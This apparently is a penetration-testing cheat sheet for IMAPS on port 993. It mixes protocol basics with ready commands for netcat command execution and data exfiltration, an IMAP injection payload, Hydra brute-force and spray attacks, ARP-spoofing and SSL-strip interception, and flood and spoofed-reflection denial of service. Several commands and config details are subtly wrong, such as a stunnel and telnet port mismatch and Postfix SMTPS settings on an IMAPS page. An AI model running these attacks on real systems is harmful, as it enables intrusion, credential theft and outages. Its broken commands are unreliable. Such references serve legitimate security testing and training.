# P993 IMAPS

## Index

* \[\[Ports, Protocols, and Services]]
  * \[\[P143 IMAP]]

## Internet Message Access Protocol Secure (IMAPS)

* **Port Number:** 993
* **Protocol:** TCP
* **Service Name:** IMAPS (Internet Message Access Protocol Secure)
* **Defined in:** RFC 3501 (IMAP) and RFC 2595 (IMAPS)

Internet Message Access Protocol Secure (IMAPS) is a protocol used by email clients to retrieve messages from a mail server over a secure connection. It is essentially the IMAP protocol (defined in RFC 3501) wrapped in SSL/TLS encryption (defined in RFC 2595). IMAPS is one of the most common methods for accessing email, especially in environments where security is a concern.

### Overview of Features

* **Secure Transmission:** IMAPS uses SSL/TLS to encrypt all data exchanged between the client and the server, ensuring the confidentiality and integrity of the email messages.
* **Persistent Mail Storage:** Unlike POP3, which typically downloads and deletes messages from the server, IMAPS allows email to be stored on the server, accessible from multiple clients.
* **Folder Management:** IMAPS supports the creation and management of mail folders on the server, allowing users to organize their email.
* **Message Synchronization:** IMAPS enables real-time synchronization of messages across multiple devices, ensuring consistency in email access.
* **Selective Download:** Clients can fetch only specific parts of an email (e.g., headers, body, attachments) without downloading the entire message.
* **Support for Multiple Mailboxes:** IMAPS allows users to access multiple mailboxes on a single server, facilitating better organization of emails.

### Typical Use Cases

* **Secure Email Retrieval:** Used by email clients to securely retrieve and manage emails from a mail server over the internet.
* **Enterprise Email Systems:** Commonly used in corporate environments where email security is paramount.
* **Multi-device Synchronization:** Ideal for users who need to access their email from multiple devices, such as smartphones, laptops, and desktop computers.
* **Email Organization:** Used by users who require extensive folder structures and message filtering capabilities.

### How IMAPS Works

1. **Connection Establishment:**
   * **Step 1:** The email client initiates a TCP connection to the mail server on port 993.
   * **Step 2:** The server responds by negotiating a secure SSL/TLS session, which encrypts all subsequent communications.
2. **Authentication:**
   * **Step 3:** Once the secure session is established, the client sends the user’s credentials (usually username and password) to the server for authentication.
   * **Step 4:** The server verifies the credentials. If they are valid, the server grants the client access to the user's mailbox.
3. **Folder Selection and Management:**
   * **Step 5:** The client sends commands to the server to select a mailbox (e.g., INBOX) and can perform actions like creating, deleting, or renaming folders.
   * **Step 6:** The server responds with the status of the requested operations, allowing the client to update its local folder structure.
4. **Message Retrieval:**
   * **Step 7:** The client issues commands to retrieve specific messages or parts of messages from the selected folder.
   * **Step 8:** The server responds by sending the requested data, which the client can then display to the user.
5. **Message Management:**
   * **Step 9:** The client can mark messages as read, unread, flagged, or deleted. These changes are reflected on the server, ensuring synchronization across all devices.
   * **Step 10:** Deleted messages can be moved to a designated folder (like Trash) or permanently removed from the server.
6. **Connection Termination:**
   * **Step 11:** When the user logs out or closes the email client, the client sends a logout command to the server.
   * **Step 12:** The server responds by terminating the SSL/TLS session and closing the TCP connection.

#### Diagram (Hypothetical Example)

* **Client:** `<attack_ip>:<attack_port>` connects to `<target_ip>:993`
* **Server:** `<target_ip>` establishes an SSL/TLS connection, authenticates the user, and provides access to the mailbox.

## Additional Information

### Security Considerations

* **Encryption Standards:** IMAPS relies on SSL/TLS for encryption, making it crucial to use strong encryption protocols and avoid deprecated versions like SSL 3.0 and TLS 1.0.
* **Vulnerability to Man-in-the-Middle (MitM) Attacks:** If SSL/TLS is not properly configured (e.g., using weak ciphers or not validating certificates), IMAPS sessions can be vulnerable to MitM attacks.
* **Certificate Management:** The security of IMAPS heavily depends on the correct implementation of SSL/TLS certificates. Self-signed certificates or expired certificates can expose the service to security risks.

### Alternatives

* **POP3S (Port 995):** Similar to IMAPS but typically downloads emails and removes them from the server, making it less suitable for users who need access from multiple devices.
* **HTTP/HTTPS (Port 80/443):** Webmail interfaces offer an alternative for accessing email securely over HTTPS, although they do not typically provide the same level of integration as IMAPS with email clients.

### Advanced Usage

* **IMAPS Proxying:** Some environments use an IMAPS proxy to offload SSL/TLS handling or to facilitate load balancing among mail servers.
* **Custom Mailbox Organization:** Advanced users may script custom IMAPS commands to automate the organization of emails, such as moving messages based on specific criteria.

### Modes of Operation

* **Online Mode:** The client continuously synchronizes with the server, with changes reflected in real-time across all devices.
* **Offline Mode:** The client downloads messages and allows offline access, with changes synchronized when the client reconnects to the server.

### Configuration Files

1. **Dovecot:**

* **Configuration File:** `/etc/dovecot/dovecot.conf`
*   **Configuration Example:**

    ```bash
    protocols = imap
    ssl = required
    ssl_cert = </etc/dovecot/ssl/dovecot.pem
    ssl_key = </etc/dovecot/ssl/dovecot.key
    ssl_protocols = !SSLv2 !SSLv3
    ssl_cipher_list = ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256
    ```
* **Key Settings:**
  * `ssl`: Specifies whether SSL/TLS is required (`required`) or optional (`yes`).
  * `ssl_cert`: Path to the SSL certificate.
  * `ssl_key`: Path to the private key for the SSL certificate.
  * `ssl_protocols`: Specifies which SSL/TLS versions are supported or disabled.
  * `ssl_cipher_list`: Defines the list of ciphers that can be used during the SSL/TLS handshake.

2. **Postfix:**

* **Configuration File:** `/etc/postfix/main.cf`
*   **Configuration Example:**

    ```bash
    smtps_tls_security_level = encrypt
    smtps_tls_cert_file = /etc/ssl/certs/ssl-cert-snakeoil.pem
    smtps_tls_key_file = /etc/ssl/private/ssl-cert-snakeoil.key
    smtps_tls_ciphers = high
    ```
* **Key Settings:**
  * `smtps_tls_security_level`: Specifies the security level, `encrypt` forces encryption.
  * `smtps_tls_cert_file`: Path to the SSL certificate.
  * `smtps_tls_key_file`: Path to the private key for the SSL certificate.
  * `smtps_tls_ciphers`: Defines the level of ciphers used for encryption (`high` for strong ciphers).

### Potential Misconfigurations

1. **Weak SSL/TLS Configurations:**
   * **Risk:** Using weak or outdated encryption protocols (e.g., SSL 3.0, TLS 1.0) can expose the IMAPS service to attacks like POODLE or BEAST.
   * **Exploitation:** Attackers can exploit these vulnerabilities to decrypt sensitive email data or perform MitM attacks.
2. **Self-Signed Certificates:**
   * **Risk:** Using self-signed certificates can lead to security warnings in clients, and users may inadvertently accept untrusted certificates, increasing the risk of MitM attacks.
   * **Exploitation:** Attackers can present a fraudulent certificate to intercept and decrypt IMAPS traffic.
3. **Unencrypted IMAP:**
   * **Risk:** Allowing unencrypted IMAP connections alongside IMAPS on the same server increases the risk of data being transmitted in clear text.
   * **Exploitation:** Attackers can sniff traffic and capture sensitive information like email contents and login credentials.
4. **Improper Folder Permissions:**
   * **Risk:** Incorrect folder permissions on the server can allow unauthorized access to mailboxes.
   * **Exploitation:** Attackers with access to the server could read or modify email content.

### Default Credentials

IMAPS does not have default credentials as it is dependent on the user accounts configured on the mail server. However, common usernames (`admin`, `root`, `user`) and weak passwords should be avoided to mitigate the risk of unauthorized access.

## Interaction and Tools

### Tools

#### \[\[IMAP]]

*   **LOGIN:** Authenticates the user to the IMAP server.

    ```bash
    telnet <target_ip> 143
    A001 LOGIN <username> <password>
    ```
*   **Listing Folders:** After connecting via OpenSSL, this command lists all mail folders available in the user's mailbox.

    ```bash
    A002 LIST "" "*"
    ```
*   **CREATE MAILBOX:** Creates a mailbox with a specified name.

    ```bash
    A003 CREATE "INBOX"
    ```
*   **RENAME MAILBOX:** Renames a mailbox.

    ```bash
    A003 RENAME "INBOX" "Important"
    ```
*   **DELETE MAILBOX:** Deletes a mailbox.

    ```bash
    A003 DELETE "INBOX"
    ```
*   **SELECT:** Selects the INBOX for further operations, such as reading or managing emails.

    ```bash
    A003 SELECT INBOX
    ```
*   **UNSELECT:** Unselects the INBOX.

    ```bash
    A003 UNSELECT INBOX
    ```
*   **FETCH Email Body:** Retrieves the full content of the first email in the selected mailbox.

    ```bash
    A004 FETCH 1 BODY[]
    ```
*   **FETCH Specific Parts of a Message:** Retrieves only the body text of the first message, excluding headers and attachments.

    ```bash
    A005 FETCH 1 (BODY[TEXT])
    ```
*   **FETCH Only Headers:** Fetches only the header of the first email, useful for quickly checking the sender and subject without downloading the full message.

    ```bash
    A006 FETCH 1 BODY[HEADER]
    ```
*   **FETCH First Five Messages:** Retrieves the headers of the first five messages.

    ```bash
    A007 FETCH 1:5 (BODY[HEADER])
    ```
*   **STORE:** Marks the first message as read.

    ```bash
    A008 STORE 1 +FLAGS (\Seen)
    ```
*   **SEARCH:** Searches for emails from a specific sender, allowing targeted retrieval of messages.

    ```bash
    A009 SEARCH FROM "example@example.com"
    ```
*   **Search Command with Multiple Criteria:** Searches for emails with "urgent" in the subject received since February 1, 2024.

    ```bash
    A010 SEARCH SUBJECT "urgent" SINCE 1-Feb-2024
    ```
*   **EXPUNGE:** Permanently removes messages marked for deletion.

    ```bash
    A011 EXPUNGE
    ```
*   **IDLE:** Allows the server to notify the client of new messages without the client polling for them.

    ```bash
    A012 IDLE
    ```
*   **LOGOUT:** Logs out of the IMAP session.

    ```bash
    A013 LOGOUT
    ```
*   **Start TLS:** Initiates TLS negotiation on an existing plaintext IMAP connection, upgrading it to a secure connection.

    ```bash
    A012 STARTTLS
    ```

#### \[\[Telnet]]

*   **Telnet Connect:** Telnet can be used to manually interact with an IMAP server, sending commands and receiving responses.

    ```bash
    telnet <target_ip> 143
    ```

#### \[\[Stunnel]]

*   **Create a Secure Tunnel:** Creating secure tunnels for services like IMAPS, allowing you to connect to them via tools like Telnet or NetCat.

    ```bash
    stunnel -d 127.0.0.1:587 -r <target_ip>:993
    ```
*   **Telnet via Stunnel (for IMAPS):** Creates a secure tunnel using Stunnel and then connects to it via Telnet, simulating an SMTPS connection.

    ```bash
    stunnel -d 127.0.0.1:587 -r <target_ip>:993
    telnet 127.0.0.1 993
    ```

#### \[\[OpenSSL]]

*   **Connect TLS Encrypted Interaction IMAP:** Establishes a secure connection to an IMAPS server using OpenSSL, allowing manual interaction with the IMAP service.

    ```bash
    openssl s_client -connect <target_ip>:993
    openssl s_client -connect <target_ip>:143 -starttls imaps
    ```
*   **Check SSL/TLS Certificate:**

    ```bash
    openssl s_client -connect <target_ip>:993 -showcerts
    ```

#### \[\[cURL]]

*   **Connect to IMAPS with username and password:**

    ```bash
    curl -k 'imaps://<target_ip>' --user <username>:<password>
    ```
*   **Use Verbose to dump additional information on the connection:**

    ```bash
    curl -k 'imaps://<target_ip>' --user <username>:<password> -v
    ```

### Exploitation Tools

#### \[\[Metasploit]]

#### \[\[Wireshark]]

*   **Wireshark Packet Capture:**

    ```bash
    wireshark -i <interface> -f "tcp port 993"
    ```

#### \[\[Nmap]]

*   **Basic Nmap Scan:** Scan target on specified port to verify if service is on.

    ```bash
    nmap <target_ip> -p 993
    ```

#### \[\[NetCat]]

*   **Netcat TCP Connect:** Simple test to verify port service is running and responding.

    ```bash
    nc <target_ip> 993
    ```
*   **Netcat UDP Connect:** Simple test to verify port service is running and responding.

    ```bash
    nc <target_ip> 993 -u
    ```
*   **Execute Commands:** Execute commands on target.

    ```bash
    echo "<command>" | nc <target_ip> 993
    ```
*   **Exfiltrate Data:** Exfiltrate data over specified port.

    ```bash
    nc <target_ip> 993 < secret_data.txt
    ```

#### \[\[SoCat Cheat Sheet]]

*   **SoCat TCP Connect:** Simple tests to verify port service is running and responding.

    ```bash
    socat - TCP:<target_ip>:993
    ```

#### \[\[HPing3 Cheat Sheet]]

*   **Send Packet:** Send TCP packet to the target service. Use `-2` to send UDP packet.

    ```bash
    hping3 <target_ip> -p 993
    ```

#### \[\[SSLScan]]

*   **Scan Target:** Detailed analysis of an HTTPS service’s SSL/TLS configuration.

    ```bash
    sslscan <target_ip>:993
    ```

#### \[\[SSLyze]]

*   **Scan Target:** Automated testing and reporting on the security of an HTTPS service.

    ```bash
    sslyze --regular <target_ip>:993
    ```

#### \[\[SSLStrip Cheat Sheet]]

*   **SSL Downgrade:**

    ```bash
    sslstrip -l 993
    ```

### Other Techniques

#### IMAP via Email Clients

* **Description:** Leverage GUI email clients to access IMAP.
  * **\[\[Evolution]]**
  * **\[\[Thunderbird]]**
  * **\[\[Microsoft Outlook]]**

#### \[\[Mutt]]

*   **Connect via username/password:** Command-line interaction with IMAPS servers for email management.

    ```bash
    mutt -f imaps://<username>@<target_ip>/INBOX
    ```

## Penetration Testing Techniques

### External Reconnaissance

#### Port Scanning

*   **Tool:** \[\[Nmap]]

    ```bash
    nmap <target_ip> -p 993
    ```
* **Description:** Identifies if the target service is running on the target by scanning target port.

#### Service Enumeration

*   **Tool:** \[\[NetCat]]

    ```bash
    nc <target_ip> 993
    ```
* **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

#### Certificate Information Gathering

*   **Tool:** \[\[OpenSSL]]

    ```bash
    openssl s_client -connect <target_ip>:993 -showcerts
    ```
* **Description:** Retrieves and displays the server’s certificate chain, useful for identifying the certificate authority and the strength of the encryption.

### Credential Harvesting

#### Packet Capture

*   **Tool:** \[\[Wireshark]]

    ```bash
    wireshark -i <interface> -f "tcp port 993"
    ```
* **Description:** Capture traffic and extract plaintext credentials.

#### Man-in-the-Middle (MITM) Attack

*   **Tool:** \[\[BetterCap Cheat Sheet]]

    ```bash
    bettercap -iface <interface> -T <target_ip> --proxy
    ```
* **Description:** Intercept and analyze traffic between the client and server, potentially capturing credentials by performing an ARP spoofing attack.

#### SSL Strip Attack

*   **Tool:** \[\[BetterCap Cheat Sheet]], \[\[SSLStrip Cheat Sheet]]

    ```bash
    bettercap -iface <interface> -T <target_ip> --proxy

    sslstrip -l 993
    ```
* **Description:** Stripping SSL from connections in a man-in-the-middle attack, forcing clients to connect over unencrypted channels.

### Internal Reconnaissance

#### IMAP Injection

*   **Tool:** \[\[NetCat]]

    ```bash
    echo 'A1 LOGIN "`/bin/ls`" "`/bin/ls`"' | nc <target_ip> 993
    ```

\


*   **Tool:** \[\[IMAP]]

    ```bash
    A001 SEARCH TEXT "a@b.com) (BOF"
    ```
* **Description:** Exploit vulnerabilities in IMAP commands by injecting malicious input. IMAP injection vulnerabilities can occur when user input is not properly sanitized before being used in IMAP commands. This can allow an attacker to manipulate IMAP commands and potentially gain unauthorized access to email data.
  1. Attacker crafts a malicious email address with embedded IMAP commands.
  2. The email address is used in an IMAP command without proper sanitization.
  3. The embedded IMAP commands are executed by the server, potentially giving the attacker access to email data.

#### Mailbox Enumeration

*   **Tool:** \[\[IMAP]], \[\[Custom Scripts]]

    ```bash
    A001 LIST "" "*"
    ```
* **Description:** Enumerate all mailboxes available to a compromised user account.

#### Search for Sensitive Information

*   **Tool:** \[\[IMAP]], \[\[Custom Scripts]]

    ```bash
    A002 SEARCH SUBJECT "password"
    ```
* **Description:** Search through emails for keywords related to sensitive information, such as passwords or financial data.

### Lateral Movement, Pivoting, and Tunnelling

#### Using IMAPS for Pivoting

*   **Tool:** \[\[SSH]]

    ```bash
    ssh -L 993:<imap_server_ip>:993 <target_ip>
    ```
* **Description:** Pivot through the IMAP server by tunneling traffic, allowing access to internal resources via the IMAP service.

### Data Exfiltration

#### Exfiltrating Sensitive Data via IMAPS

*   **Tool:** \[\[IMAP]], \[\[Custom Scripts]]

    ```bash
    A004 FETCH 1:5 (BODY[TEXT])
    ```
* **Description:** Extract sensitive data, such as documents or passwords, from emails stored on the server.

#### Covert Channels via IMAP

*   **Tool:** \[\[Custom Scripts]]

    ```bash
    echo "exfil data" | nc <target_ip> 993
    ```
* **Description:** Use IMAP as a covert channel to exfiltrate data while blending in with legitimate email traffic.

## Exploits and Attacks

### Password Attacks

#### Password Brute Force

*   **Tool:** \[\[Hydra Cheat Sheet]]

    ```bash
    hydra imap-sec://<target_ip> -s 993 -l <username> -P <password_list>
    ```
* **Description:** Test a single username against multiple passwords.

#### Password Spray

*   **Tool:** \[\[Hydra Cheat Sheet]]

    ```bash
    hydra imap-sec://<target_ip> -s 993 -l <username_list> -P <password>
    ```
* **Description:** Test a multiple usernames against a single password.

### Denial of Service

#### TCP/UPD Flood Attack

*   **Tool:** \[\[HPing3 Cheat Sheet]]

    ```bash
    hping3 <target_ip> -p 993 --flood --rand-source -c 1000
    ```
* **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

#### TCP/UDP Reflection Attack

*   **Tool:** \[\[HPing3 Cheat Sheet]]

    ```bash
    hping3 <target_ip_1> -p 993 --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
* **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

#### SSL/TLS Handshake Flood

*   **Tool:** \[\[OpenSSL]]

    ```bash
    while true; do openssl s_client -connect <target_ip>:993 & done
    ```
* **Description:** Floods the service with SSL/TLS handshake requests, overwhelming the server.

#### Excessive IMAP Commands

*   **Tool:** \[\[Custom Scripts]]

    ```bash
    while true; do openssl s_client -connect <target_ip>:993 -quiet; echo "a1 LIST \"\" \"*\""; sleep 1; done
    ```
* **Description:** Send a high volume of IMAP commands to the server, consuming resources and potentially leading to a denial of service.

### Exploits

#### Heartbleed (CVE-2014-0160)

*   **Tool:** \[\[Nmap]]

    ```bash
    nmap --script ssl-heartbleed -p 993 <target_ip>
    ```
* **Description:** Exploiting the Heartbleed vulnerability in OpenSSL to extract sensitive information from the server's memory.

#### POODLE (Padding Oracle On Downgraded Legacy Encryption)

*   **Tool:** \[\[Nmap]]

    ```bash
    nmap --script ssl-poodle -p 993 <target_ip>
    ```
* **Description:** Exploit the POODLE vulnerability by forcing a downgrade to SSL 3.0 and performing a padding oracle attack.

#### DROWN (CVE-2016-0800)

*   **Tool:** \[\[Nmap]]

    ```bash
    nmap --script ssl-drown -p 993 <target_ip>
    ```
* **Description:** Exploit the DROWN vulnerability by attacking servers that support both SSLv2 and TLS, potentially decrypting secure connections.

#### SSL/TLS Downgrade Attack

*   **Tool:** \[\[BetterCap Cheat Sheet]], \[\[SSLStrip Cheat Sheet]]

    ```bash
    bettercap -iface <interface> -T <target_ip> --proxy

    sslstrip -l 993
    ```
* **Description:** Forces a downgrade of the SSL/TLS connection to a weaker protocol that can be exploited or decrypted.

## Resources

| **Website**                     | **URL**                                                           |
| ------------------------------- | ----------------------------------------------------------------- |
| RFC 3501 (IMAP)                 | https://tools.ietf.org/html/rfc3501                               |
| RFC 2595 (IMAPS)                | https://tools.ietf.org/html/rfc2595                               |
| Nmap SSL/TLS Scan               | https://nmap.org/nsedoc/scripts/ssl-enum-ciphers.html             |
| OpenSSL Documentation           | https://www.openssl.org/docs/man1.1.1/man1/openssl-s\_client.html |
| Hydra Brute Force Tool          | https://github.com/vanhauser-thc/thc-hydra                        |
| Metasploit Framework            | https://www.metasploit.com                                        |
| Thunderbird Email Client        | https://www.thunderbird.net/en-US/                                |
| Heartbleed Vulnerability        | https://heartbleed.com                                            |
| Wireshark User Guide            | https://www.wireshark.org/docs/wsug\_html\_chunked/               |
| SSLScan Tool                    | https://github.com/rbsec/sslscan                                  |
| TLS Renegotiation Vulnerability | https://tools.ietf.org/html/rfc5746                               |
